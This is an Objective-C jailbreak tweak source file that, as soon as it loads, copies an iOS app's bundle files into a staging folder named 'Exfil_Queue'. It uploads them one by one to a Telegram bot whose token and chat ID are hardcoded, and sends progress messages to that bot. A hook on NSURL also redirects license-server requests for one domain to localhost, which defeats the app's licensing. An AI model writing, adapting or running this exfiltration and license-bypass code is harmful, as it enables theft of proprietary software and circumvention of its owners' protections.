#import <UIKit/UIKit.h>
#import <substrate.h>
#import <mach-o/dyld.h>

// --- CONFIGURATION ---
#define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
#define TG_CHAT_ID @"7730331218"
#define IGNORE_NAME @"Enigma"

// --- HELPER: LOGGING ---
void sendText(NSString *text) {
    @try {
        NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                            TG_TOKEN, TG_CHAT_ID, 
                            [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
        [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:urlStr] completionHandler:nil] resume];
    } @catch (NSException *e) {}
}

// --- HELPER: UPLOAD ---
NSData *createBody(NSString *boundary, NSString *filename, NSData *data) {
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"document\"; filename=\"%@\"\r\n", filename] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

// =========================================================
// PART 1: THE PERSISTENT QUEUE SYSTEM
// =========================================================
void processQueue() {
    NSString *docPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *queuePath = [docPath stringByAppendingPathComponent:@"Exfil_Queue"];
    NSFileManager *fm = [NSFileManager defaultManager];
    
    // 1. Get List of Files waiting in Queue
    NSArray *queuedFiles = [fm contentsOfDirectoryAtPath:queuePath error:nil];
    
    if (queuedFiles.count == 0) {
        // Queue is empty, nothing to do.
        return;
    }
    
    sendText([NSString stringWithFormat:@"🔄 RESUMING UPLOAD: %lu files remaining in queue...", (unsigned long)queuedFiles.count]);

    // 2. Process Queue One by One
    for (NSString *filename in queuedFiles) {
        NSString *filePath = [queuePath stringByAppendingPathComponent:filename];
        NSData *fileData = [NSData dataWithContentsOfFile:filePath];
        
        if (fileData) {
            // Synchronous Upload to ensure order
            NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument?chat_id=%@", TG_TOKEN, TG_CHAT_ID];
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
            [request setHTTPMethod:@"POST"];
            NSString *boundary = @"Boundary-PersistentExfil";
            [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
            [request setHTTPBody:createBody(boundary, filename, fileData)];
            
            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
            [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
                if (!e) {
                    // 3. DELETE AFTER SUCCESSFUL UPLOAD
                    [fm removeItemAtPath:filePath error:nil];
                }
                dispatch_semaphore_signal(sema);
            }] resume];
            dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
        }
    }
    sendText(@"✅ QUEUE FINISHED! All files uploaded.");
}

// =========================================================
// PART 2: THE INSTANT GRABBER
// =========================================================
void grabAndStageFiles() {
    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
    NSString *docPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *queuePath = [docPath stringByAppendingPathComponent:@"Exfil_Queue"];
    NSFileManager *fm = [NSFileManager defaultManager];
    
    // Create Queue Folder if not exists
    if (![fm fileExistsAtPath:queuePath]) {
        [fm createDirectoryAtPath:queuePath withIntermediateDirectories:YES attributes:nil error:nil];
        
        // --- THIS RUNS ONLY ONCE (First Launch) ---
        sendText(@"🚀 FIRST RUN: Copying files to safe storage...");
        
        NSDirectoryEnumerator *enumerator = [fm enumeratorAtPath:bundlePath];
        NSString *file;
        int count = 0;
        
        while (file = [enumerator nextObject]) {
            // FILTER: Code & Configs Only
            if ([file hasSuffix:@".png"] || [file hasSuffix:@".jpg"] || 
                [file hasSuffix:@".car"] || [file hasSuffix:@".lproj"] || 
                [file containsString:IGNORE_NAME]) { 
                continue; 
            }
            
            NSString *srcPath = [bundlePath stringByAppendingPathComponent:file];
            NSString *dstPath = [queuePath stringByAppendingPathComponent:[file lastPathComponent]]; // Flatten structure
            
            // FAST COPY (Disk to Disk)
            [fm copyItemAtPath:srcPath toPath:dstPath error:nil];
            count++;
        }
        sendText([NSString stringWithFormat:@"💾 SAVED %d FILES to Documents. Starting upload...", count]);
    }
    
    // START UPLOADING FROM QUEUE
    processQueue();
}

// =========================================================
// PART 3: KEEP APP ALIVE (Bypass License)
// =========================================================
%hook NSURL
+ (instancetype)URLWithString:(NSString *)URLString {
    if ([URLString localizedCaseInsensitiveContainsString:@"0devs.org"]) return %orig(@"http://127.0.0.1");
    return %orig;
}
- (instancetype)initWithString:(NSString *)URLString {
    if ([URLString localizedCaseInsensitiveContainsString:@"0devs.org"]) return %orig(@"http://127.0.0.1");
    return %orig;
}
%end

%ctor {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        grabAndStageFiles();
    });
}
